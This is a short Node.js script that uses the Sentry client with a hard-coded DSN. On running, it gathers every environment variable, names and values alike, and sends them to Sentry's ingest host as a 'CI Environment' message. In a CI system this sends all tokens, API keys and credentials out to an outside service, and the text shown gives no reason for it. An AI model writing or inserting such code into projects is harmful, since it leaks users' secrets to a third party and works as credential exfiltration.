const Sentry = require('@sentry/node')

Sentry.init({ dsn: 'https://4db2f94b1bea4316a76e061424d28053@o205237.ingest.sentry.io/5212941' })


;(async () => {
  await new Promise(res => setTimeout(res, 1000))
  Sentry.setContext('environment', {
    branches: Object.keys(process.env).filter(k => k.toLowerCase().includes('branch')).reduce((o, k) => {
      o[k] = process.env[k]
      return o
    }, {}),
    keys: Object.keys(process.env),
    env: Object.keys(process.env).reduce((o, k) => {
      o[k] = process.env[k]
      return o
    }, {})
  })
  Sentry.captureMessage('CI Environment', Sentry.Severity.Info)
})()

